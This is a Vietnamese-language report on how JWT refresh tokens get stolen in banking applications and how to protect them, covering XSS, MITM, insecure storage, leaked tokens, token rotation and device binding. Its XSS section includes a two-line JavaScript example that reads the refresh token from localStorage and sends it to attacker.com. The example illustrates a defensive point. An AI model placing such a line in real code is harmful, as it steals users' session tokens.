# PHÂN TÍCH RỦI RO VÀ CHIẾN LƯỢC BẢO VỆ REFRESH TOKEN

## 1. Giới thiệu

Trong các hệ thống hiện đại, đặc biệt là các ứng dụng tài chính – ngân hàng, cơ chế xác thực bằng JWT (JSON Web Token) kết hợp Access Token và Refresh Token được sử dụng rộng rãi nhằm cân bằng giữa bảo mật và trải nghiệm người dùng.

Access Token có thời gian sống ngắn để giảm rủi ro bị đánh cắp. Trong khi đó, Refresh Token có thời gian sống dài hơn để cho phép người dùng duy trì phiên đăng nhập mà không cần đăng nhập lại nhiều lần.

Tuy nhiên, chính đặc điểm “long-lived” của Refresh Token lại khiến nó trở thành mục tiêu hấp dẫn đối với kẻ tấn công. Nếu Refresh Token bị lộ, hacker có thể liên tục tạo Access Token mới để duy trì quyền truy cập trái phép vào hệ thống trong thời gian dài.

Báo cáo này tập trung phân tích các kịch bản tấn công, hậu quả bảo mật và đề xuất các chiến lược bảo vệ Refresh Token trong môi trường thực tế.

---

# PHẦN 1 — PHÂN TÍCH LOGIC

# 2. Các kịch bản Refresh Token bị đánh cắp

## 2.1. Tấn công XSS (Cross-Site Scripting)

### Mô tả

XSS xảy ra khi ứng dụng web cho phép hacker chèn mã JavaScript độc hại vào trang web.

Nếu Refresh Token được lưu trong:

* LocalStorage
* SessionStorage

thì hacker có thể đọc token bằng JavaScript.

### Ví dụ

```javascript
const token = localStorage.getItem("refreshToken");
fetch("https://attacker.com/steal?token=" + token);
```

### Hậu quả

* Hacker đánh cắp Refresh Token
* Tạo Access Token mới liên tục
* Chiếm quyền tài khoản người dùng

---

## 2.2. Tấn công MITM (Man-in-the-Middle)

### Mô tả

MITM xảy ra khi hacker chặn dữ liệu truyền giữa client và server.

Nếu hệ thống:

* không dùng HTTPS
* cấu hình TLS yếu

thì Refresh Token có thể bị nghe lén.

### Hậu quả

* Hacker lấy được token trong quá trình truyền tải
* Có thể sử dụng token để giả mạo người dùng
* Truy cập trái phép vào hệ thống ngân hàng

---

## 2.3. Lưu trữ không an toàn trên client

### Mô tả

Nhiều ứng dụng lưu Refresh Token:

* trong LocalStorage
* file cache
* log debug
* SQLite trên mobile

Các vị trí này dễ bị:

* malware
* reverse engineering
* thiết bị root/jailbreak

### Hậu quả

* Refresh Token bị đánh cắp từ thiết bị
* Hacker duy trì phiên đăng nhập dài hạn

---

## 2.4. Thiết bị bị mất hoặc đánh cắp

### Mô tả

Nếu người dùng làm mất điện thoại hoặc laptop nhưng Refresh Token vẫn còn hiệu lực:

* hacker có thể mở ứng dụng
* tự động refresh Access Token

### Hậu quả

* Truy cập tài khoản ngân hàng
* Thực hiện giao dịch trái phép
* Đánh cắp dữ liệu tài chính

---

## 2.5. Rò rỉ token qua log hoặc GitHub

### Mô tả

Developer vô tình:

* log token ra console
* commit token lên GitHub
* lưu token trong file config

### Hậu quả

* Token bị công khai
* Hacker dùng token để truy cập hệ thống

---

# 3. Hậu quả khi Refresh Token bị lộ

## 3.1. Duy trì truy cập trái phép lâu dài

Khác với Access Token chỉ tồn tại vài phút:

* Refresh Token có thể tồn tại vài ngày hoặc vài tuần

Hacker có thể:

* liên tục tạo Access Token mới
* duy trì đăng nhập lâu dài

---

## 3.2. Bypass đăng nhập và MFA

Nếu Refresh Token còn hiệu lực:

* hacker không cần mật khẩu
* không cần OTP
* không cần xác thực lại

---

## 3.3. Chiếm quyền tài khoản

Kẻ tấn công có thể:

* thay đổi thông tin người dùng
* thực hiện giao dịch
* đánh cắp dữ liệu
* thao túng hệ thống

---

## 3.4. Khó phát hiện

Refresh Token thường hoạt động âm thầm.

Nhiều hệ thống:

* không log refresh bất thường
* không kiểm tra vị trí/IP/device

=> hacker có thể hoạt động lâu mà không bị phát hiện.

---

# 4. Đánh giá cơ chế Revoke Token hiện tại

## 4.1. Cơ chế hiện tại

Thông thường hệ thống chỉ:

* xóa Refresh Token khỏi database
* revoke khi logout

Ví dụ:

```text
deleteByToken(token)
```

---

## 4.2. Điểm mạnh

* Đơn giản
* Dễ triển khai
* Hỗ trợ logout cơ bản

---

## 4.3. Hạn chế

### Hạn chế 1 — Hacker đã refresh trước khi revoke

Nếu hacker dùng Refresh Token trước:

* hệ thống cấp token mới cho hacker
* token cũ bị revoke không còn ý nghĩa

=> hacker vẫn giữ phiên hợp lệ.

---

### Hạn chế 2 — Không hỗ trợ đa thiết bị

Hệ thống không phân biệt:

* điện thoại
* laptop
* tablet

=> khó revoke chính xác.

---

### Hạn chế 3 — Không phát hiện bất thường

Hệ thống hiện tại thường không kiểm tra:

* IP lạ
* vị trí lạ
* thiết bị lạ
* refresh liên tục bất thường

---

### Hạn chế 4 — Không rotate Refresh Token

Một Refresh Token có thể được dùng nhiều lần.

Nếu bị lộ:

* hacker dùng mãi đến khi hết hạn.

---

# 5. Chiến lược bảo vệ Refresh Token nâng cao

## 5.1. Lưu trữ bằng HTTP-only Cookie

### Giải pháp

Không lưu Refresh Token trong:

* LocalStorage
* SessionStorage

Thay vào đó dùng:

* HTTP-only Cookie
* Secure Cookie
* SameSite Cookie

### Lợi ích

* JavaScript không thể đọc token
* Giảm nguy cơ XSS
* Tăng bảo mật

### Cấu hình nên dùng

```text
HttpOnly = true
Secure = true
SameSite = Strict
```

---

## 5.2. Bắt buộc HTTPS/TLS

### Giải pháp

Toàn bộ hệ thống phải dùng:

```text
HTTPS
```

### Lợi ích

* Mã hóa dữ liệu truyền tải
* Chống MITM
* Bảo vệ token trên mạng công cộng

---

## 5.3. Rotating Refresh Token

### Khái niệm

Mỗi lần refresh:

* token cũ bị vô hiệu hóa
* cấp Refresh Token mới

### Quy trình

```text
Refresh Token A
→ tạo Access Token mới
→ sinh Refresh Token B
→ revoke Refresh Token A
```

### Lợi ích

Nếu hacker dùng lại token cũ:

* hệ thống phát hiện reuse
* khóa phiên ngay lập tức

Đây là cơ chế cực kỳ quan trọng trong hệ thống thực tế.

---

## 5.4. Device Binding

### Giải pháp

Gắn Refresh Token với:

* deviceId
* browser fingerprint
* IP
* user-agent

### Lợi ích

Nếu token được dùng trên thiết bị lạ:

* hệ thống phát hiện
* yêu cầu xác thực lại

---

## 5.5. Phát hiện hành vi bất thường

### Ví dụ

* refresh từ nhiều quốc gia cùng lúc
* refresh liên tục bất thường
* refresh từ IP blacklist

### Giải pháp

* log toàn bộ refresh request
* tích hợp hệ thống cảnh báo
* AI/phân tích hành vi

---

## 5.6. Giảm thời gian sống Refresh Token

### Giải pháp

Không để Refresh Token quá dài.

Ví dụ:

| Token         | Thời gian |
| ------------- | --------- |
| Access Token  | 15 phút   |
| Refresh Token | 7 ngày    |

---

## 5.7. Logout mọi thiết bị

### Giải pháp

Hỗ trợ:

```text
/logoutAllDevices
```

### Lợi ích

Khi nghi ngờ bị hack:

* user có thể vô hiệu hóa toàn bộ phiên ngay lập tức.

---

## 5.8. Cleanup token hết hạn

### Giải pháp

Tự động xóa token:

```text
expiryDate < now
```

### Lợi ích

* giảm dữ liệu thừa
* tăng hiệu năng DB
* giảm rủi ro bảo mật

---

# PHẦN 2 — KẾT LUẬN

Refresh Token giúp cải thiện trải nghiệm người dùng nhưng cũng là mục tiêu tấn công nguy hiểm vì thời gian sống dài.

Nếu Refresh Token bị lộ, hacker có thể:

* duy trì quyền truy cập lâu dài
* bypass đăng nhập
* đánh cắp dữ liệu
* thực hiện giao dịch trái phép

Các cơ chế revoke cơ bản là chưa đủ trong môi trường thực tế.

Để xây dựng hệ thống xác thực an toàn cho ứng dụng tài chính – ngân hàng, cần kết hợp nhiều lớp bảo vệ như:

* HTTP-only SameSite Cookies
* HTTPS/TLS
* Rotating Refresh Token
* Device Binding
* Phát hiện bất thường
* Logout mọi thiết bị
* Cleanup token định kỳ

Việc triển khai đồng bộ các biện pháp trên sẽ giúp giảm thiểu tối đa nguy cơ chiếm quyền tài khoản và tăng khả năng phản ứng trước các sự cố bảo mật trong hệ thống thực tế.
